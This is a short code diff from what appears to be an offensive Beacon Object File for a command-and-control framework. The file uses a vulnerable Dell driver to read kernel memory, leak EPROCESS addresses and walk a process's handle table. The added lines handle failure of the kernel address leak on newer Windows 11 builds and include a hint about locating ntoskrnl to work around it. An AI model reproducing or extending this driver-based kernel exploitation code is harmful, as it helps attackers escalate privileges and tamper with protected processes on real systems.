@@ -502,6 +502,13 @@ HANDLE OpenHandle(DWORD tpid, DWORD processPrivMask) {
 	}
 	ULONGLONG targetEprocess = leakKernHandle(curProcId, outHnd[0]);
 
+	// Check if either handle is null (win11 build 26100+ won't allow leakKernHandle to work since it uses NtQuerySystemInfo to grab kernel handles
+	//	HINT: You can use EnumDeviceDrivers to get the base addr of ntoskrnl and find an offset to an initial EPROCESS from there. This won't be added to the public release 
+	if (!curEprocess || !targetEprocess) {
+		BeaconPrintf(CALLBACK_OUTPUT,"[!] Could leak eprocess addresses with NtQuerySystemInformation, you might be on Win11 build 26100 or later. \n(This will not be fixed in the public release)");
+		return NULL;
+	}
+	
 	// Get address of _HANDLE_TABLE structure
 	ULONGLONG hndTable = readqword(hDellDriver, (curEprocess + EPROC_HANDLE_TABLE));
 	BeaconPrintf(CALLBACK_OUTPUT,"[+] Handle table for process %llx at %llx", curEprocess, hndTable);
